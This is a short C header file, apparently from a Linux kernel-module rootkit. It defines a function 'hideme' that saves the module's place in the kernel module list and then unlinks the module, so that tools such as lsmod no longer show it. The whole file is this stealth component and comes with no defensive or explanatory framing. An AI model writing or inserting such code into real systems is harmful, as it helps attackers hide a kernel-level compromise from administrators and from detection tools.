#ifndef HIDE_LKM_H
#define HIDE_LKM_H

#include <linux/list.h>

static struct list_head *prev_module;
static short hidden = 0;

static inline void hideme(void)
{
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    hidden = 1;
}

#endif